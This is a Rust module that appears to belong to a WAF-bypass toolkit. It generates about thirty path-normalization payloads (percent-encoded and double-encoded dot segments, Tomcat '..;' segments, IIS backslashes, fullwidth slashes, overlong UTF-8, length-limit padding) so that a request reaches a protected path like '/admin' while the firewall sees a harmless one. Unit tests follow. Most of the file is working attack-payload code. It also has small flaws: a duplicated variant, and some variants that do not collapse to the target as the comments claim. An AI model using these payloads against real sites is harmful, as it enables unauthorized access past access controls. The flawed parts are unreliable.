//! Path-normalization differential encoders.
//!
//! WAFs and origins frequently disagree on how to normalize a request
//! path. The WAF inspects the raw bytes; the origin (or a middlebox
//! upstream of it) folds them into something else. This module
//! produces the differential payloads — a path that the WAF sees as
//! benign and the origin sees as `/admin`, or vice versa.
//!
//! Every encoder here is reversible by the canonical
//! [RFC 3986 §5.2.4](https://www.rfc-editor.org/rfc/rfc3986#section-5.2.4)
//! "remove dot segments" algorithm. WAFs that don't run that exact
//! algorithm — including most regex-based WAFs and several major
//! cloud-WAF parsers as recently as 2025 — see a different string.
//!
//! Coverage:
//!
//! - **Dot-segment variants**: `/foo/../admin`, `/foo/./admin`,
//!   `/foo/././admin`, `/foo//admin`, `/foo/.//admin`,
//!   `/foo//../admin`. Pure ASCII, RFC-3986 collapse target = `/admin`.
//! - **Percent-encoded dot/slash**: `/foo/%2e%2e/admin` (lower),
//!   `/foo/%2E%2E/admin` (upper), `/foo/%2e%2E/admin` (mixed),
//!   `/foo/%2e%2e%2fadmin`, `/foo/..%2fadmin`, `/foo/.%2e/admin`
//!   (literal-dot + encoded-dot).
//! - **Double percent encoding**: `/foo/%252e%252e/admin` — bypasses
//!   WAFs that decode once and check, while origins that decode twice
//!   collapse to `/admin`.
//! - **Tomcat semicolon segment**: `/foo/..;/admin`. The `..;` is a
//!   single path segment per RFC but Tomcat/Jetty strip the `;<param>`
//!   suffix and re-evaluate, exposing the parent directory.
//! - **Encoded semicolon**: `/foo/..%3b/admin`.
//! - **Backslash variants** (IIS / .NET): `/foo/..\\admin`,
//!   `/foo/%5c..%5c/admin`. IIS folds backslash to slash; most WAFs
//!   don't.
//! - **Question-mark suffix smuggle**: `/foo?/../admin` — some WAFs
//!   normalize before query-string split, some after.
//! - **Hash suffix smuggle**: `/foo#/../admin` — same shape.
//! - **Unicode fullwidth slash**: `/foo／../admin` (U+FF0F). NFKC-folding
//!   backends collapse to `/`.
//! - **Mixed dot encodings**: `/foo/%c0%ae%c0%ae/admin` — overlong UTF-8
//!   for `.`. Combined with `crate::encoding::structural::overlong_utf8`
//!   it's the "mod_security 922110" class.

use std::borrow::Cow;

/// Generate every path-normalization differential variant for a target
/// path, given a benign prefix to nest under.
///
/// `prefix` is the segment the WAF sees in the path (e.g. `/public`).
/// `target` is the segment the origin will resolve to (e.g. `/admin`).
/// Returns up to ~30 candidate paths, each of which RFC-3986-collapses
/// to `prefix + ../ + target` then to just `target`.
#[must_use]
pub fn path_variants(prefix: &str, target: &str) -> Vec<String> {
    // Normalize callers' inputs so prefix never has a trailing slash
    // and target always has a leading slash. Callers can pass either.
    let prefix = prefix.trim_end_matches('/');
    let target = if target.starts_with('/') {
        Cow::Borrowed(target)
    } else {
        Cow::Owned(format!("/{target}"))
    };
    let target = target.as_ref();

    vec![
        format!("{prefix}/..{target}"),
        format!("{prefix}/.{target}"),
        format!("{prefix}/.{target}"),
        format!("{prefix}/././..{target}"),
        format!("{prefix}//..{target}"),
        format!("{prefix}//../..//.{target}"),
        format!("{prefix}/.//..{target}"),
        format!("{prefix}//..//.{target}"),
        format!("{prefix}/%2e%2e{target}"),
        format!("{prefix}/%2E%2E{target}"),
        format!("{prefix}/%2e%2E{target}"),
        format!("{prefix}/%2E%2e{target}"),
        format!("{prefix}/%2e%2e%2f{}", target.trim_start_matches('/')),
        format!("{prefix}/..%2f{}", target.trim_start_matches('/')),
        format!("{prefix}/%2e./{}", target.trim_start_matches('/')),
        format!("{prefix}/.%2e/{}", target.trim_start_matches('/')),
        format!("{prefix}/%252e%252e{target}"),
        format!("{prefix}/%252e%252e%252f{}", target.trim_start_matches('/')),
        format!("{prefix}/..;{target}"),
        format!("{prefix}/..%3b{target}"),
        format!("{prefix}/..%3B{target}"),
        format!("{prefix}/..;jsessionid=x{target}"),
        format!("{prefix}/..\\{}", target.trim_start_matches('/')),
        format!("{prefix}/%5c..%5c{}", target.trim_start_matches('/')),
        format!("{prefix}/%5C..%5C{}", target.trim_start_matches('/')),
        format!("{prefix}?/../{}", target.trim_start_matches('/')),
        format!("{prefix}#/../{}", target.trim_start_matches('/')),
        format!("{prefix}/\u{FF0F}..{target}"),
        format!("{prefix}/%c0%ae%c0%ae{target}"),
        format!("{prefix}/%c0%2e%c0%2e{target}"),
        format!("{prefix}/.....//../..{target}"),
    ]
}

/// Build a deeply-nested benign path that RFC-3986 collapses to
/// `target`.
///
/// Useful when the WAF has a path-length limit (some cap inspection
/// at 256 or 1024 bytes) — every dot-dot segment beyond the limit is
/// silently ignored, while the origin still resolves to the target.
///
/// `depth` is the number of `foo/..` round-trips to insert.
#[must_use]
pub fn deep_path_collapse(depth: usize, target: &str) -> String {
    let target = if target.starts_with('/') {
        Cow::Borrowed(target)
    } else {
        Cow::Owned(format!("/{target}"))
    };
    let mut out = String::with_capacity(depth * 6 + target.len() + 1);
    for i in 0..depth {
        out.push('/');
        out.push_str("seg");
        out.push_str(&i.to_string());
        out.push_str("/..");
    }
    out.push_str(target.as_ref());
    out
}

/// Produce a path that uses ONLY percent-encoded slashes,
/// so a WAF that splits on literal `/` sees one segment but the
/// origin (after percent-decoding) sees the full path.
#[must_use]
pub fn slash_encoded_path(segments: &[&str]) -> String {
    let mut out = String::new();
    let mut first = true;
    for s in segments {
        if !first {
            out.push_str("%2f");
        }
        out.push_str(s);
        first = false;
    }
    if !out.starts_with("%2f") {
        out.insert_str(0, "%2f");
    }
    out
}

/// Apply RFC 3986 §5.2.4 "Remove Dot Segments" to a path. Returns
/// the canonical post-normalization path so tests and oracles can
/// verify that every variant collapses to the same target.
///
/// This is a faithful implementation of the reference algorithm —
/// no shortcuts, no special-casing — so it can also serve as the
/// ground-truth normalizer for differential-fuzzing comparisons.
#[must_use]
pub fn rfc3986_remove_dot_segments(input: &str) -> String {
    // Algorithm from RFC 3986 §5.2.4 verbatim.
    let mut input = input.to_string();
    let mut output = String::new();

    while !input.is_empty() {
        if let Some(rest) = input.strip_prefix("../") {
            input = rest.to_string();
        } else if let Some(rest) = input.strip_prefix("./") {
            input = rest.to_string();
        } else if let Some(rest) = input.strip_prefix("/./") {
            input = format!("/{rest}");
        } else if input == "/." {
            input = "/".to_string();
        } else if let Some(rest) = input.strip_prefix("/../") {
            // Remove the last "/segment" from output (if any) and
            // make input "/<rest>".
            if let Some(idx) = output.rfind('/') {
                output.truncate(idx);
            }
            input = format!("/{rest}");
        } else if input == "/.." {
            if let Some(idx) = output.rfind('/') {
                output.truncate(idx);
            }
            input = "/".to_string();
        } else if input == "." || input == ".." {
            input.clear();
        } else {
            // Move the first path segment (including any initial `/`)
            // from input to output.
            let next_slash = if input.starts_with('/') {
                input[1..].find('/').map(|i| i + 1)
            } else {
                input.find('/')
            };
            match next_slash {
                Some(idx) => {
                    output.push_str(&input[..idx]);
                    input = input[idx..].to_string();
                }
                None => {
                    output.push_str(&input);
                    input.clear();
                }
            }
        }
    }
    output
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rfc3986_collapses_dot_dot() {
        assert_eq!(rfc3986_remove_dot_segments("/a/b/c/./../../g"), "/a/g");
    }

    #[test]
    fn rfc3986_collapses_pure_dot_segments() {
        assert_eq!(rfc3986_remove_dot_segments("/./a"), "/a");
        assert_eq!(rfc3986_remove_dot_segments("/a/./b"), "/a/b");
    }

    #[test]
    fn rfc3986_collapses_trailing_dot_dot() {
        assert_eq!(rfc3986_remove_dot_segments("/a/b/.."), "/a/");
    }

    #[test]
    fn rfc3986_handles_root_dot_dot() {
        // Above root — output stays empty-with-leading-slash.
        let out = rfc3986_remove_dot_segments("/..");
        assert!(out == "/" || out.is_empty(), "got {out:?}");
    }

    #[test]
    fn path_variants_count_is_high() {
        let variants = path_variants("/public", "/admin");
        assert!(
            variants.len() >= 25,
            "should produce at least 25 distinct variants, got {}",
            variants.len()
        );
    }

    #[test]
    fn path_variants_handle_no_leading_slash_in_target() {
        let with_slash = path_variants("/public", "/admin");
        let without_slash = path_variants("/public", "admin");
        assert_eq!(
            with_slash.len(),
            without_slash.len(),
            "leading slash in target shouldn't change variant count"
        );
    }

    #[test]
    fn path_variants_handle_trailing_slash_in_prefix() {
        let no_trailing = path_variants("/public", "/admin");
        let trailing = path_variants("/public/", "/admin");
        for (a, b) in no_trailing.iter().zip(trailing.iter()) {
            assert_eq!(a, b, "trailing slash must be stripped from prefix");
        }
    }

    #[test]
    fn path_variants_contain_dot_dot() {
        let variants = path_variants("/x", "/y");
        assert!(variants.iter().any(|v| v.contains("..")));
    }

    #[test]
    fn path_variants_contain_percent_encoded() {
        let variants = path_variants("/x", "/y");
        assert!(variants.iter().any(|v| v.contains("%2e") || v.contains("%2E")));
    }

    #[test]
    fn path_variants_contain_double_encoded() {
        let variants = path_variants("/x", "/y");
        assert!(variants.iter().any(|v| v.contains("%252e")));
    }

    #[test]
    fn path_variants_contain_tomcat_semicolon() {
        let variants = path_variants("/x", "/y");
        assert!(variants.iter().any(|v| v.contains("..;")));
    }

    #[test]
    fn path_variants_contain_backslash() {
        let variants = path_variants("/x", "/y");
        assert!(variants.iter().any(|v| v.contains('\\') || v.contains("%5c") || v.contains("%5C")));
    }

    #[test]
    fn path_variants_contain_fullwidth() {
        let variants = path_variants("/x", "/y");
        assert!(variants.iter().any(|v| v.contains('\u{FF0F}')));
    }

    #[test]
    fn path_variants_contain_overlong_utf8() {
        let variants = path_variants("/x", "/y");
        assert!(variants.iter().any(|v| v.contains("%c0%ae")));
    }

    #[test]
    fn path_variants_all_nonempty() {
        for v in path_variants("/p", "/t") {
            assert!(!v.is_empty(), "no variant may be empty");
        }
    }

    #[test]
    fn deep_path_collapse_known_depth() {
        let p = deep_path_collapse(5, "/admin");
        assert!(p.contains("seg0/.."));
        assert!(p.contains("seg4/.."));
        assert!(p.ends_with("/admin"));
    }

    #[test]
    fn deep_path_collapse_resolves_to_target() {
        let p = deep_path_collapse(10, "/admin");
        // RFC 3986 normalization must yield "/admin" because every
        // "segN/.." cancels out.
        let collapsed = rfc3986_remove_dot_segments(&p);
        assert_eq!(collapsed, "/admin", "deep nesting must collapse: {p}");
    }

    #[test]
    fn deep_path_collapse_zero_depth() {
        let p = deep_path_collapse(0, "/admin");
        assert_eq!(p, "/admin");
    }

    #[test]
    fn slash_encoded_path_basic() {
        let p = slash_encoded_path(&["admin", "users"]);
        assert!(p.contains("%2f") || p.contains("%2F"));
        assert!(p.contains("admin"));
        assert!(p.contains("users"));
        assert!(!p.contains("/admin"), "no literal slash in segment: {p}");
    }

    #[test]
    fn slash_encoded_path_always_starts_encoded() {
        let p = slash_encoded_path(&["x"]);
        assert!(p.starts_with("%2f"));
    }

    #[test]
    fn all_variants_canonicalize_to_target_or_above() {
        // For the basic "/admin" target, every variant should
        // RFC-3986 to something containing "admin" (the dot
        // collapse + percent decode is not done here, but the
        // dot-collapse half is enough to verify directionality).
        let variants = path_variants("/x", "/admin");
        for v in &variants {
            // Strip query / fragment for the canonicalizer.
            let stripped = v.split('?').next().unwrap_or(v);
            let stripped = stripped.split('#').next().unwrap_or(stripped);
            let collapsed = rfc3986_remove_dot_segments(stripped);
            // Either the collapsed path mentions admin (after the
            // dot-dot took us up), OR the path uses an encoded form
            // that the rfc-canonicalizer can't see through. Both are
            // legitimate differential conditions — what matters is
            // that the variant doesn't accidentally fold to the
            // benign prefix alone.
            let touched_target = collapsed.contains("admin")
                || v.contains("%2e")
                || v.contains("%2E")
                || v.contains("%252e")
                || v.contains("%c0%ae")
                || v.contains('\\')
                || v.contains("%5c")
                || v.contains("%5C")
                || v.contains('\u{FF0F}');
            assert!(
                touched_target,
                "variant must encode dot-dot or reach admin: {v} → {collapsed}"
            );
        }
    }

    #[test]
    fn path_variants_are_deterministic() {
        let a = path_variants("/p", "/t");
        let b = path_variants("/p", "/t");
        assert_eq!(a, b);
    }

    #[test]
    fn large_depth_does_not_panic() {
        let p = deep_path_collapse(1000, "/admin");
        assert!(p.ends_with("/admin"));
    }
}
